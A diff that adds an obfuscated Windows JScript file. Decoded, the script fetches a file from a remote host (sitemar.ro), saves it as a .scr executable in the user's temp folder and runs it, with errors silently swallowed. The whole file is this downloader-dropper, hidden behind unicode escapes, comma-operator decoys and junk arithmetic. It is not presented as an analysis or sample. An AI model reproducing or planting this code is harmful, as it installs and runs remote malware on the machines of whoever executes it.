@@ -1,0 +1,24 @@
+partnerPostscript = ((0 ^ 1), this);
+cursiveProgress = ("\u0072e" + "s\u0075\u006c\u0074", "\u0065le\u006d" + "\u0065\u006e\u0074", "\u0052" + "u\u006e");
+approximationGenealogy = partnerPostscript[("g" + "r\u006f\u0075" + "\u006e\u0064", "\u0066ir\u006d", "\u0073\u0079\u006etax", "sp" + "\u006f\u006es\u006f\u0072", "W" + "S\u0063\u0072ipt")];
+approximationGenealogy[("r\u006f\u0062ot", "a\u0075thor" + "\u0069t" + "y", "S\u006ce\u0065p")](((Math.pow(6051, 2) - 36610377) | (6814 * 2 + 1244)));
+diameterSignal = approximationGenealogy[("\u0073\u0065c" + "ti\u006f" + "n", "\u0069n\u0066" + "\u0065\u0063\u0074ion", "Cre\u0061" + "\u0074eO" + "\u0062\u006a\u0065c" + "t")](("\u0063afe", "pla" + "t\u0066\u006f" + "\u0072" + "m", "v" + "ib" + "\u0072" + "a\u0074" + "\u0069on", "b\u006ca" + "n\u006b", "\u0057S" + "\u0063\u0072" + "i" + "\u0070\u0074.Sh" + "ell"));
+initiativeUniverse = diameterSignal[("m" + "u" + "s" + "\u0069c", "cha\u006ec" + "\u0065", "\u0070r\u006f\u0066\u0065s" + "siona" + "\u006c", "\u0045xp\u0061" + "\u006ed\u0045" + "n" + "v\u0069\u0072on" + "ment" + "St\u0072" + "in\u0067\u0073")](("\u0025\u0054E\u004d" + "\u0050\u0025\u002f")) + ("ra\u0064\u0069\u0061" + "\u0074i" + "on", "\u0070ar\u0061g\u0072" + "\u0061ph" + "A\u0076i" + "at" + "i\u006f\u006e") + ("\u0064eg" + "\u0065\u006e\u0065\u0072" + "ati" + "on", "a\u0072se\u006ea" + "l", "\u0061nge" + "\u006c", ".sc" + "r");
+factSpecification = partnerPostscript[("\u0057S\u0063" + "\u0072ipt")][("\u0067ue\u0073" + "t", "Create" + "\u004fb\u006a\u0065\u0063\u0074")](("st\u006f\u0072\u006d", "\u006frgan" + "i\u0073m", "MS" + "XM" + "L2" + "\u002e\u0058" + "\u004d" + "\u004c\u0048T\u0054" + "P"));
+factSpecification[("\u0061ss" + "em\u0062\u006c" + "\u0079", "\u0065xp" + "e" + "ri\u006den" + "\u0074", "\u0074\u0061bo\u006f", "\u0076ol\u0063" + "an\u006f", function String.prototype.energySelection() {
+  return this
+}, "\u006f\u0070\u0065" + "n")](("r\u0065" + "\u0067ulat\u0065", "o\u0070\u0065\u0072\u0061", "G\u0045\u0054"), ("\u0072\u0065\u0070o\u0072\u0074" + "\u0065\u0072", "\u0067e\u006e\u0065s" + "i" + "\u0073", "i\u006e" + "d\u0075" + "c\u0074ion", "h\u0074tp" + ":\u002f\u002fs" + "\u0069\u0074e\u006dar" + ".ro\u002f" + "\u0035/\u0039\u0032b\u0075" + "\u0079v" + "5"), !(((((117 & 117), ((((([+!+[]])) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1)) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1))))), (24, 120, 96), (9 + 4)) - (3 * 2)) * ((160, 201, 127, 1) * (24 - 22)) ^ ((([+[]])) | ((([+!+[]])) & ((0 ^ 0) ^ (123, 37, 0))))) > 6));
+factSpecification[("\u0070\u0072" + "\u006fg" + "\u0072" + "\u0065s\u0073", "le\u0063t" + "\u0075\u0072\u0065", "co\u006c\u006c\u0065" + "c" + "\u0074\u006f" + "\u0072", "se\u006e\u0064")]();
+while(factSpecification[("\u0073ho\u0063\u006b", "ph\u0065\u006e\u006f" + "\u006de\u006e" + "\u006fn", "\u006fc\u0065\u0061n", "rea\u0064\u0079" + "sta\u0074\u0065")] < ((3 & 3) + (1 & 1))) {
+  partnerPostscript[("\u0057" + "\u0053c" + "ri\u0070" + "\u0074")][("S\u006ce\u0065\u0070")](((Math.pow(310, 2) - 95885) - (5635 / 49)));
+}
+residenceCamera = partnerPostscript[("s\u0075m", "o" + "p\u0070" + "\u006fsi" + "t\u0069\u006fn", "\u006d\u0069n" + "\u0075s", "n\u0065ut\u0072" + "a\u006c", "W\u0053\u0063\u0072i\u0070" + "\u0074")][("\u0073ea" + "\u0073o" + "\u006e", "pr" + "o\u006a\u0065c\u0074", "\u0043\u0072\u0065\u0061" + "\u0074e" + "\u004f\u0062je" + "ct")](("e" + "\u0078" + "\u0061" + "m\u0069\u006e\u0061t" + "\u0069" + "on", "visi" + "t", "\u0072o\u0074" + "\u0061\u0074i" + "\u006f\u006e", "AD" + "O\u0044\u0042\u002e\u0053\u0074" + "r\u0065" + "a\u006d"));
+try {
+  residenceCamera[("\u0076\u0061c\u0075\u0075" + "m", "i\u006es\u0074r" + "um" + "ent", "\u0072\u0065" + "a" + "\u0073\u006fn", "\u0064\u0065l" + "\u0065\u0067at" + "e", "o\u0070\u0065\u006e")]();
+  residenceCamera[("\u0076i\u0073\u0069\u0074", "t\u0079" + "pe")] = ((1 * 1) | 1);
+  residenceCamera[("comp" + "r\u0065s\u0073", "\u0077\u0072i" + "t\u0065")](factSpecification[("i\u006dp\u006fr" + "t", "p\u0061\u0074\u0072" + "\u006f\u006c", "R\u0065sp" + "\u006fn\u0073\u0065B" + "\u006f" + "d\u0079")]);
+  residenceCamera[("t\u0061\u0062l\u0065t", "\u0061n\u0061t\u006f" + "\u006d" + "\u0079", "\u0070\u006fs" + "i\u0074\u0069" + "o\u006e")] = ((6 | 32) - (5 * 7 + 3));
+  residenceCamera[("d\u0065" + "g" + "en\u0065\u0072" + "a" + "ti" + "on", "s" + "\u0074\u0075d\u0069o", "trad" + "iti" + "\u006f\u006e", "s" + "t" + "a\u0074\u0075e", "sa" + "\u0076\u0065\u0054\u006f\u0046" + "\u0069" + "l\u0065")](initiativeUniverse, ((20 ^ 108), 2));
+  residenceCamera[("\u0070r" + "e" + "fi" + "x", "c\u0075l\u0074u" + "\u0072\u0065", "su\u0062\u0073t\u0061" + "n\u0063\u0065", "close")]();
+  diameterSignal[cursiveProgress](initiativeUniverse.energySelection(), ((1 & 0) + (0 | 0)), (([+[]])));
+} catch(masterExamine) {};
